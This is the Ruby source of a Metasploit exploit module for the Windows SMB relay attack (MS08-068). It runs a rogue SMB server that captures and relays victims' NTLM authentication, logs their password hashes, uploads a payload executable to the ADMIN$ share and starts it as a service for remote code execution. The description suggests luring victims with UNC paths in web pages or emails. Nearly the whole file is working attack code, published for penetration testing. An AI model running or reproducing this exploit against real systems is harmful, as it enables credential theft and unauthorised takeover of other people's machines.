##
# $Id: smb_relay.rb 10404 2010-09-21 00:13:30Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


=begin
Windows XP systems that are not part of a domain default to treating all
network logons as if they were Guest. This prevents SMB relay attacks from
gaining administrative access to these systems. This setting can be found
under:

	Local Security Settings >
	 Local Policies >
	  Security Options >
	   Network Access: Sharing and security model for local accounts
=end

require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::SMBServer
	include Msf::Exploit::EXE

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft Windows SMB Relay Code Execution',
			'Description'    => %q{
					This module will relay SMB authentication requests to another
				host, gaining access to an authenticated SMB session if successful.
				If the connecting user is an administrator and network logins are
				allowed to the target machine, this module will execute an arbitrary
				payload. To exploit this, the target system	must try to	authenticate
				to this module. The easiest way to force a SMB authentication attempt
				is by embedding a UNC path (\\\\SERVER\\SHARE) into a web page or
				email message. When the victim views the web page or email, their
				system will automatically connect to the server specified in the UNC
				share (the IP address of the system running this module) and attempt
				to authenticate.  Unfortunately, this
				module is not able to clean up after itself. The service and payload
				file listed in the output will need to be manually removed after access
				has been gained. The service created by this tool uses a randomly chosen
				name and description, so the services list can become cluttered after
				repeated exploitation.

				The SMB authentication relay attack was first reported by Sir Dystic on
				March 31st, 2001 at @lanta.con in Atlanta, Georgia.

				On November 11th 2008 Microsoft released bulletin MS08-068. This bulletin
				includes a patch which prevents the relaying of challenge keys back to
				the host which issued them, preventing this exploit from working in
				the default configuration. It is still possible to set the SMBHOST
				parameter to a third-party host that the victim is authorized to access,
				but the "reflection" attack has been effectively broken.
			},
			'Author'         =>
				[
					'hdm'
				],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 10404 $',
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread'
				},
			'Payload'        =>
				{
					'Space'        => 2048,
					'DisableNops'  => true,
					'StackAdjustment' => -3500,
				},
			'References'     =>
				[
					[ 'CVE', '2008-4037'],
					[ 'OSVDB', '49736'],
					[ 'MSB', 'MS08-068'],
					[ 'URL', 'http://blogs.technet.com/swi/archive/2008/11/11/smb-credential-reflection.aspx'],
					[ 'URL', 'http://en.wikipedia.org/wiki/SMBRelay' ],
					[ 'URL', 'http://www.microsoft.com/technet/sysinternals/utilities/psexec.mspx' ],
					[ 'URL', 'http://www.xfocus.net/articles/200305/smbrelay.html' ]
				],
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', { } ],
				],
			'DisclosureDate' => 'Mar 31 2001',
			'DefaultTarget'  => 0 ))

		register_options(
			[
				OptAddress.new('SMBHOST', [ false, "The target SMB server (leave empty for originating system)"])
			], self.class )
	end


	if (not const_defined?('NDR'))
		NDR = Rex::Encoder::NDR
	end

	def smb_haxor(c)
		smb = @state[c]
		rclient = smb[:rclient]

		if (@pwned[smb[:rhost]])
			print_status("Ignoring request from #{smb[:rhost]}, attack already in progress.")
			return
		end

		if (not rclient.client.auth_user)
			print_line(" ")
			print_error(
				"FAILED! The remote host has only provided us with Guest privileges. " +
				"Please make sure that the correct username and password have been provided. " +
				"Windows XP systems that are not part of a domain will only provide Guest privileges " +
				"to network logins by default."
			)
			print_line(" ")
			return
		end

		print_status("Connecting to the ADMIN$ share...")
		rclient.connect("ADMIN$")

		@pwned[smb[:rhost]] = true

		print_status("Regenerating the payload...")
		code = regenerate_payload(smb[:rsock])

		# Upload the shellcode to a file
		print_status("Uploading payload...")

		filename = rand_text_alpha(8) + ".exe"
		servicename = rand_text_alpha(8)

		fd = rclient.open("\\#{filename}", 'rwct')

		exe = ''
		opts = {
			:servicename => servicename,
			:code => code.encoded
		}
		if (datastore['PAYLOAD'].include? 'x64')
			opts.merge!({ :arch => ARCH_X64 })
		end
		exe = generate_payload_exe_service(opts)

		fd << exe
		fd.close

		print_status("Created \\#{filename}...")

		# Disconnect from the ADMIN$
		rclient.disconnect("ADMIN$")

		print_status("Connecting to the Service Control Manager...")
		rclient.connect("IPC$")

		dcerpc = smb_dcerpc(c, '367abb81-9844-35f1-ad32-98f038001003', '2.0', "\\svcctl")

		##
		# OpenSCManagerW()
		##

		print_status("Obtaining a service manager handle...")
		scm_handle = nil
		stubdata =
			NDR.uwstring("\\\\#{smb[:rhost]}") +
			NDR.long(0) +
			NDR.long(0xF003F)
		begin
			response = dcerpc.call(0x0f, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
				scm_handle = dcerpc.last_response.stub_data[0,20]
			end
		rescue ::Exception => e
			print_error("Error: #{e}")
			return
		end

		##
		# CreateServiceW()
		##

		servicename = rand_text_alpha(8)
		displayname = rand_text_alpha(rand(32)+1)
		svc_handle  = nil
		svc_status  = nil

		print_status("Creating a new service...")
		stubdata =
			scm_handle +
			NDR.wstring(servicename) +
			NDR.uwstring(displayname) +

			NDR.long(0x0F01FF) + # Access: MAX
			NDR.long(0x00000110) + # Type: Interactive, Own process
			NDR.long(0x00000003) + # Start: Demand
			NDR.long(0x00000000) + # Errors: Ignore

			NDR.wstring("%SYSTEMROOT%\\#{filename}") + # Binary Path
			NDR.long(0) + # LoadOrderGroup
			NDR.long(0) + # Dependencies
			NDR.long(0) + # Service Start
			NDR.long(0) + # Password
			NDR.long(0) + # Password
			NDR.long(0) + # Password
			NDR.long(0)   # Password
		begin
			response = dcerpc.call(0x0c, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
				svc_handle = dcerpc.last_response.stub_data[0,20]
				svc_status = dcerpc.last_response.stub_data[24,4]
			end
		rescue ::Exception => e
			print_error("Error: #{e}")
			return
		end


		##
		# CloseHandle()
		##
		print_status("Closing service handle...")
		begin
			response = dcerpc.call(0x0, svc_handle)
		rescue ::Exception
		end

		##
		# OpenServiceW
		##
		print_status("Opening service...")
		begin
			stubdata =
				scm_handle +
				NDR.wstring(servicename) +
				NDR.long(0xF01FF)

			response = dcerpc.call(0x10, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
				svc_handle = dcerpc.last_response.stub_data[0,20]
			end
		rescue ::Exception => e
			print_error("Error: #{e}")
			return
		end

		##
		# StartService()
		##
		print_status("Starting the service...")
		stubdata =
			svc_handle +
			NDR.long(0) +
			NDR.long(0)
		begin
			response = dcerpc.call(0x13, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
			end
		rescue ::Exception => e
			return
			#print_error("Error: #{e}")
		end

		##
		# DeleteService()
		##
		print_status("Removing the service...")
		stubdata =
			svc_handle
		begin
			response = dcerpc.call(0x02, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
			end
		rescue ::Exception => e
			print_error("Error: #{e}")
		end

		##
		# CloseHandle()
		##
		print_status("Closing service handle...")
		begin
			response = dcerpc.call(0x0, svc_handle)
		rescue ::Exception => e
			print_error("Error: #{e}")
		end

		rclient.disconnect("IPC$")

		print_status("Deleting \\#{filename}...")
		rclient.connect("ADMIN$")
		rclient.delete("\\#{filename}")
	end


	def smb_dcerpc(c, uuid, version, pipe)
		smb  = @state[c]
		opts = {
			'Msf' => framework,
			'MsfExploit' => self,
			'smb_pipeio' => 'rw',
			'smb_client' => smb[:rclient]
		}

		handle = Rex::Proto::DCERPC::Handle.new([uuid, version], 'ncacn_np', smb[:ip], [pipe])
		dcerpc = Rex::Proto::DCERPC::Client.new(handle, smb[:rsock], opts)
	end


	def smb_cmd_dispatch(cmd, c, buff)
		smb = @state[c]

		@pwned ||= {}

		case cmd
		when CONST::SMB_COM_NEGOTIATE
			smb_cmd_negotiate(c, buff)

		when CONST::SMB_COM_SESSION_SETUP_ANDX
			smb_cmd_session_setup(c, buff)

		when CONST::SMB_COM_TREE_CONNECT
			print_status("Denying tree connect from #{smb[:name]}")
			pkt = CONST::SMB_BASE_PKT.make_struct
			pkt['Payload']['SMB'].v['Command'] = cmd
			pkt['Payload']['SMB'].v['Flags1']  = 0x88
			pkt['Payload']['SMB'].v['Flags2']  = 0xc001
			pkt['Payload']['SMB'].v['ErrorClass'] = 0xc0000022
			c.put(pkt.to_s)

		else
			print_status("Ignoring request from #{smb[:name]} (#{cmd})")
			pkt = CONST::SMB_BASE_PKT.make_struct
			pkt['Payload']['SMB'].v['Command'] = cmd
			pkt['Payload']['SMB'].v['Flags1']  = 0x88
			pkt['Payload']['SMB'].v['Flags2']  = 0xc001
			pkt['Payload']['SMB'].v['ErrorClass'] = 0 # 0xc0000022
			c.put(pkt.to_s)
		end
	end

	def smb_cmd_negotiate(c, buff)
		smb = @state[c]
		pkt = CONST::SMB_NEG_PKT.make_struct
		pkt.from_s(buff)

		# Record the remote process ID
		smb[:process_id] = pkt['Payload']['SMB'].v['ProcessID']

		group    = ''
		machine  = smb[:nbsrc]

		dialects = pkt['Payload'].v['Payload'].gsub(/\x00/, '').split(/\x02/).grep(/^\w+/)
		# print_status("Negotiation from #{smb[:name]}: #{dialects.join(", ")}")

		dialect =
			dialects.index("NT LM 0.12") ||
			dialects.length-1


		# Dialect selected, now we try to the target system
		target_host = datastore['SMBHOST']
		if (not target_host or target_host.strip.length == 0)
			target_host = smb[:ip]
		end

		rsock = nil
		rport = nil
		[445, 139].each do |rport_|
			rport = rport_
			begin
				rsock = Rex::Socket::Tcp.create(
					'PeerHost'  => target_host,
					'PeerPort'  => rport,
					'Timeout'   => 3,
					'Context'   =>
						{
							'Msf'        => framework,
							'MsfExploit' => self,
						}
				)
				break if rsock
			rescue ::Interrupt
				raise $!
			rescue ::Exception => e
				print_error("Error connecting to #{target_host}:#{rport} #{e.class} #{e}")
			end
		end

		if(not rsock)
			print_error("Could not connect to the target host (#{target_host}), the target may be firewalled.")
			return
		end

		rclient = Rex::Proto::SMB::SimpleClient.new(rsock, rport == 445 ? true : false)

		begin
			rclient.login_split_start_ntlm1(smb[:nbsrc])
		rescue ::Interrupt
			raise $!
		rescue ::Exception => e
			print_error("Could not negotiate NTLMv1 with #{target_host}:#{rport} #{e.class} #{e}")
			raise e
		end

		if (not rclient.client.challenge_key)
			print_error("No challenge key received from #{smb[:ip]}:#{rport}")
			rsock.close
			return
		end

		if (smb[:rsock])
			smb[:rsock].close
		end

		smb[:rsock] = rsock
		smb[:rclient] = rclient
		smb[:rhost] = target_host

		pkt = CONST::SMB_NEG_RES_NT_PKT.make_struct
		smb_set_defaults(c, pkt)

		time_hi, time_lo = UTILS.time_unix_to_smb(Time.now.to_i)

		pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_NEGOTIATE
		pkt['Payload']['SMB'].v['Flags1'] = 0x88
		pkt['Payload']['SMB'].v['Flags2'] = 0xc001
		pkt['Payload']['SMB'].v['WordCount'] = 17
		pkt['Payload'].v['Dialect'] = dialect
		pkt['Payload'].v['SecurityMode'] = 3
		pkt['Payload'].v['MaxMPX'] = 2
		pkt['Payload'].v['MaxVCS'] = 1
		pkt['Payload'].v['MaxBuff'] = 4356
		pkt['Payload'].v['MaxRaw'] = 65536
		pkt['Payload'].v['Capabilities'] = 0xe3fd # 0x80000000 for extended
		pkt['Payload'].v['ServerTime'] = time_lo
		pkt['Payload'].v['ServerDate'] = time_hi
		pkt['Payload'].v['Timezone']   = 0x0


		pkt['Payload'].v['SessionKey'] = 0
		pkt['Payload'].v['KeyLength'] = 8

		pkt['Payload'].v['Payload'] =
			rclient.client.challenge_key +
			Rex::Text.to_unicode(group) + "\x00\x00" +
			Rex::Text.to_unicode(machine) + "\x00\x00"

		c.put(pkt.to_s)
	end

	def smb_cmd_session_setup(c, buff)
		smb = @state[c]
		pkt = CONST::SMB_SETUP_NTLMV1_PKT.make_struct
		pkt.from_s(buff)


		# Record the remote multiplex ID
		smb[:multiplex_id] = pkt['Payload']['SMB'].v['MultiplexID']

		lm_len = pkt['Payload'].v['PasswordLenLM']
		nt_len = pkt['Payload'].v['PasswordLenNT']

		lm_hash = pkt['Payload'].v['Payload'][0, lm_len].unpack("H*")[0]
		nt_hash = pkt['Payload'].v['Payload'][lm_len, nt_len].unpack("H*")[0]


		buff = pkt['Payload'].v['Payload']
		buff.slice!(0, lm_len + nt_len)
		names = buff.split("\x00\x00").map { |x| x.gsub(/\x00/, '') }

		smb[:username] = names[0]
		smb[:domain]   = names[1]
		smb[:peer_os]   = names[2]
		smb[:peer_lm]   = names[3]


		# Clean up the data for loggging
		if (smb[:username] == "")
			smb[:username] = nil
		end

		if (smb[:domain] == "")
			smb[:domain] = nil
		end

		print_status(
			"Received #{smb[:name]} #{smb[:domain]}\\#{smb[:username]} " +
			"LMHASH:#{lm_hash ? lm_hash : "<NULL>"} NTHASH:#{nt_hash ? nt_hash : "<NULL>"} " +
			"OS:#{smb[:peer_os]} LM:#{smb[:peer_lm]}"
		)

		if (lm_hash == "" or lm_hash == "00")
			lm_hash = nil
		end

		if (nt_hash == "")
			nt_hash = nil
		end

		if (lm_hash or nt_hash)
			rclient = smb[:rclient]
			print_status("Authenticating to #{smb[:rhost]} as #{smb[:domain]}\\#{smb[:username]}...")
			res = nil

			begin
				res = rclient.login_split_next_ntlm1(
					smb[:username],
					smb[:domain],
					[ (lm_hash ? lm_hash : "00" * 24) ].pack("H*"),
					[ (nt_hash ? nt_hash : "00" * 24) ].pack("H*")
				)
			rescue XCEPT::LoginError
			end

			if (res)
				print_status("AUTHENTICATED as #{smb[:domain]}\\#{smb[:username]}...")
				smb_haxor(c)
			else
				print_error("Failed to authenticate as #{smb[:domain]}\\#{smb[:username]}...")
			end
		end

		print_status("Sending Access Denied to #{smb[:name]} #{smb[:domain]}\\#{smb[:username]}")

		pkt = CONST::SMB_BASE_PKT.make_struct
		smb_set_defaults(c, pkt)

		pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_SESSION_SETUP_ANDX
		pkt['Payload']['SMB'].v['Flags1']  = 0x88
		pkt['Payload']['SMB'].v['Flags2']  = 0xc001
		pkt['Payload']['SMB'].v['ErrorClass'] = 0xC0000022
		c.put(pkt.to_s)
	end

end